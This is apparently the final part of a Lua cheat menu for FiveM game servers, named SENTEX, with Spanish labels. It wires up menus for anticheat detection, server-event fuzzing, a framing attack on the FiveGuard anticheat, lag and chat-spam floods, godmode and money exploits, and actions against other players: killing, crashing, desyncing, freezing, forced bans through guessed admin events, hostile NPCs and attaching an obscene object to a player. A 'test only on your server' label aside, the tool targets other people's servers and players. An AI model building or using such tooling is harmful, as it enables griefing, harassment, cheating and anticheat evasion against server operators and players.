                local tree = CreateObject(GetHashKey(modelName), x, y, hitPos.z, true, true, false)
                if tree and tree~=0 then
                    FreezeEntityPosition(tree, true)
                    NetworkRegisterEntityAsNetworked(tree)
                    SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(tree), true)
                    SetEntityAsMissionEntity(tree, true, true)
                    table.insert(_spawnedTrees, tree)
                    created = created + 1
                end
                SetModelAsNoLongerNeeded(modelName)
            end
        end
        if i%50==0 then _w(0) end
    end
    Notify("~g~Selva creada con "..created.." árboles")
end

-- ============================================================================
--                    FUNCIÓN PARA CREAR ACCIONES DINÁMICAS DE JUGADOR
-- ============================================================================
local function crearAccionPlayer(pid, tipo)
    return function()
        if tipo == "inventory" then _abrirInventario(pid)
        elseif tipo == "revive" then _revivirJugador(pid)
        elseif tipo == "kill" then _matarJugador(pid)
        elseif tipo == "follow" then _followPlayer(pid)
        elseif tipo == "teleport" then _teleportTo(pid)
        elseif tipo == "spawnnpc" then _spawnNPCs(pid, _r(3,6))
        elseif tipo == "attachveh" then _engancharVehCercano(pid)
        elseif tipo == "ban" then
            local sid = GetPlayerServerId(pid)
            if sid then
                TriggerServerEvent('admin:ban', sid, "test")
                TriggerServerEvent('staff:banPlayer', sid, "test")
                Notify("~y~Intento de baneo directo")
            end
        elseif tipo == "framing" then _framingAttack(pid)
        elseif tipo == "spectate" then _spectatePlayer(pid)
        elseif tipo == "attachdildo" then _attachDildoToPlayer(pid)
        elseif tipo == "freeze" then _freezePlayer(pid)
        elseif tipo == "crash" then _crashAttempt(pid)
        elseif tipo == "desync" then _startDesync(pid)
        end
    end
end

-- ============================================================================
--                    REGISTRO DE MENÚS ESTÁTICOS
-- ============================================================================
RegisterMenuModule("main", {
    {nombre="[»] Self options", submenu="self", desc="Opciones del jugador"},
    {nombre="[»] Vehicle options", submenu="vehicle", desc="Opciones para vehículos"},
    {nombre="[»] Player list", submenu="player_list", desc="Interactuar con otros jugadores"},
    {nombre="[»] Map fucker", submenu="map_fucker", desc="Opciones del mapa"},
    {nombre="[»] Event Hunter", submenu="event_hunter", desc="Event Hunter y Framing"},
    {nombre="[»] Protection options", submenu="protection", desc="Herramientas de seguridad"},
    {nombre="[»] Server Attacks (TEST)", submenu="server_attacks", desc="Pruebas de vulnerabilidades (solo tu servidor)"},
})

RegisterMenuModule("self", {
    {nombre="• Curar", accion=_curar, desc="Restaura salud y armadura"},
    {nombre="• Revivir ESX", accion=_revivirESX, desc="Resucita en servidores ESX"},
    {nombre="• Revivir QB", accion=_revivirQB, desc="Resucita en servidores QB/QC"},
    {nombre="• Noclip", toggle=true, toggleValue=false, onToggle=_toggleNoclip, desc="Atraviesa paredes (WASD + Shift boost)"},
})

RegisterMenuModule("vehicle", {
    {nombre="• Spawn vehicle", accion=_spawnVeh, desc="Escribe modelo y spawnea"},
    {nombre="• Vehicle list", submenu="vehicle_list", desc="Vehículos cercanos (150m)"},
    {nombre="• Cargar vehículo", accion=_cargarVeh, desc="Apunta y carga un vehículo"},
    {nombre="• Lanzar vehículo", accion=_lanzarVeh, desc="Lanza el cargado"},
    {nombre="• Reparar", accion=_repararVeh, desc="Repara tu vehículo"},
    {nombre="• Tunear al máximo", accion=_tuneVehicleMax, desc="Mejora completa"},
    {nombre="• Shift Boost", toggle=true, toggleValue=false, onToggle=_toggleShiftBoost, desc="Aceleración extra con SHIFT"},
    {nombre="• Enganchar todos (100m)", accion=_attachAllNearbyVehicles, desc="Engancha todos los vehículos cercanos"},
    {nombre="• Soltar todos", accion=_detachAllVehicles, desc="Desengancha todos"},
    {nombre="• Voltear", accion=_flipVeh, desc="Voltea el vehículo"},
    {nombre="• Limpiar", accion=_limpiarVeh, desc="Limpia el vehículo"},
})

RegisterMenuModule("map_fucker", {
    {nombre="• Bloque stunt gigante", accion=_spawnStuntBlock, desc="Crea bloque enorme"},
    {nombre="• Spawnear Selva", accion=_createForest, desc="Crea bosque de árboles"},
})

RegisterMenuModule("protection", {
    {nombre="• AC Checker", accion=_scanAC, desc="Detecta anticheats conocidos"},
})

RegisterMenuModule("event_hunter", {
    {nombre="• Iniciar Event Hunter", accion=_startFuzzing, desc="Prueba eventos comunes"},
    {nombre="• Ataque Framing (FiveGuard)", accion=function()
        Notify("~y~Selecciona jugador desde Player List")
        _G.MenuCurrent = "player_list"
        _G.MenuOption = 1
    end, desc="Abre lista de jugadores"},
})

RegisterMenuModule("server_attacks", {
    {nombre="• Máquina de lag", toggle=true, toggleValue=false, onToggle=function(val) if val then _startLagMachine() else _startLagMachine() end end, desc="Activa/desactiva lag masivo"},
    {nombre="• Chat spam", toggle=true, toggleValue=false, onToggle=function(val) if val then _startChatSpam() else _startChatSpam() end end, desc="Inunda el chat"},
    {nombre="• Test Godmode exploit", accion=_testGodmodeExploit, desc="Prueba bypass de godmode"},
    {nombre="• Test Money exploit", accion=_testMoneyExploit, desc="Intenta generar dinero infinito"},
    {nombre="• Congelar jugador", accion=function()
        Notify("~y~Selecciona jugador desde Player List")
        _G.MenuCurrent = "player_list"
        _G.MenuOption = 1
    end, desc="Congela a un jugador (desync)"},
    {nombre="• Crash intent", accion=function()
        Notify("~y~Selecciona jugador desde Player List")
        _G.MenuCurrent = "player_list"
        _G.MenuOption = 1
    end, desc="Intenta crashear a un jugador"},
    {nombre="• Desync player", accion=function()
        Notify("~y~Selecciona jugador desde Player List")
        _G.MenuCurrent = "player_list"
        _G.MenuOption = 1
    end, desc="Envía posiciones falsas constantemente"},
})

-- ============================================================================
--                MENÚS DINÁMICOS (vehicle_list, player_list y submenús)
-- ============================================================================
local function _vehiculosCercanos()
    local list = {}
    local p = PlayerPedId()
    local pCoord = GetEntityCoords(p)
    local pool = GetGamePool("CVehicle")
    for i=1,#pool do
        local v = pool[i]
        if v ~= 0 and #(pCoord - GetEntityCoords(v)) < 150.0 then
            table.insert(list, v)
        end
    end
    return list
end
local function _nombreVeh(v)
    local model = GetEntityModel(v)
    local name = GetLabelText(GetDisplayNameFromVehicleModel(model))
    if name == "NULL" or name == "" then
        name = GetDisplayNameFromVehicleModel(model)
        if name == "NULL" or name == "" then
            name = tostring(model):upper()
        end
    end
    return name
end

local dynamicSubmenus = {}
local function refreshVehicleList()
    local vehs = _vehiculosCercanos()
    local opts = {}
    for i, v in ipairs(vehs) do
        local dname = _nombreVeh(v)
        local submenuName = "vehicle_" .. tostring(v)
        opts[i] = {nombre="• "..dname, submenu=submenuName, desc="Opciones para "..dname}
        if not dynamicSubmenus[submenuName] then
            dynamicSubmenus[submenuName] = {
                {nombre="• Reparar", accion=function() _repararVeh(v) end, desc="Repara este vehículo"},
                {nombre="• Voltear", accion=function() _flipVeh(v) end, desc="Voltea este vehículo"},
                {nombre="• Limpiar", accion=function() _limpiarVeh(v) end, desc="Limpia este vehículo"},
                {nombre="• Conducir", accion=function()
                    local ped = PlayerPedId()
                    local driver = GetPedInVehicleSeat(v, -1)
                    if driver and driver ~= 0 then
                        ClearPedTasksImmediately(driver)
                        SetEntityCoords(driver, GetEntityCoords(driver)+vector3(1.0,1.0,0.5), false, false, false, false)
                        _w(200)
                    end
                    TaskWarpPedIntoVehicle(ped, v, -1)
                    Notify("~g~Te has subido al vehículo")
                end, desc="Subirte (expulsa conductor)"},
                {nombre="• Tunear al máximo", accion=function() _tuneVehicleMax(v) end, desc="Mejora al máximo"},
            }
            RegisterMenuModule(submenuName, dynamicSubmenus[submenuName])
        end
    end
    if #opts == 0 then opts = {{nombre="• No hay vehículos cerca", accion=nil, desc="Acércate"}} end
    RegisterMenuModule("vehicle_list", opts)
end

local function refreshPlayerList()
    local players = _listaJugadores()
    local opts = {}
    for i, pid in ipairs(players) do
        local name = _nombreJugador(pid)
        local submenuName = "player_" .. tostring(pid)
        opts[i] = {nombre="• "..name, submenu=submenuName, desc="Opciones para "..name}
        if not dynamicSubmenus[submenuName] then
            dynamicSubmenus[submenuName] = {
                {nombre="• Abrir inventario", accion=crearAccionPlayer(pid,"inventory"), desc="Abre inventario"},
                {nombre="• Revivir", accion=crearAccionPlayer(pid,"revive"), desc="Intenta revivir"},
                {nombre="• Matar", accion=crearAccionPlayer(pid,"kill"), desc="Mata al jugador"},
                {nombre="• Seguir", accion=crearAccionPlayer(pid,"follow"), desc="Sigue al jugador"},
                {nombre="• Teleportar", accion=crearAccionPlayer(pid,"teleport"), desc="Teletransportarse"},
                {nombre="• Spawn NPCs (3-6)", accion=crearAccionPlayer(pid,"spawnnpc"), desc="NPCs hostiles"},
                {nombre="• Enganchar vehículo cercano", accion=crearAccionPlayer(pid,"attachveh"), desc="Engancha vehículo"},
                {nombre="• Banear (simple)", accion=crearAccionPlayer(pid,"ban"), desc="Intenta banear"},
                {nombre="• Ataque Framing", accion=crearAccionPlayer(pid,"framing"), desc="Contra FiveGuard"},
                {nombre="• Espectear", accion=crearAccionPlayer(pid,"spectate"), desc="Espectar al jugador"},
                {nombre="• Enganchar nepe", accion=crearAccionPlayer(pid,"attachdildo"), desc="Le engancha un dildo en la cara (persistente)"},
                {nombre="• Congelar (desync)", accion=crearAccionPlayer(pid,"freeze"), desc="Congela al jugador temporalmente"},
                {nombre="• Crash intent", accion=crearAccionPlayer(pid,"crash"), desc="Intenta crashear al jugador"},
                {nombre="• Desync (posiciones)", accion=crearAccionPlayer(pid,"desync"), desc="Activa desync constante (toggle)"},
            }
            RegisterMenuModule(submenuName, dynamicSubmenus[submenuName])
        end
    end
    if #opts == 0 then opts = {{nombre="• No hay jugadores", accion=nil, desc="Espera"}} end
    RegisterMenuModule("player_list", opts)
end

-- Actualización periódica de listas dinámicas
Citizen.CreateThread(function()
    while true do
        _w(2000)
        refreshVehicleList()
        refreshPlayerList()
    end
end)

refreshVehicleList()
refreshPlayerList()

Notify("~g~[SENTEX] Módulos completos cargados (con toggles, dildo persistente, listas dinámicas).")
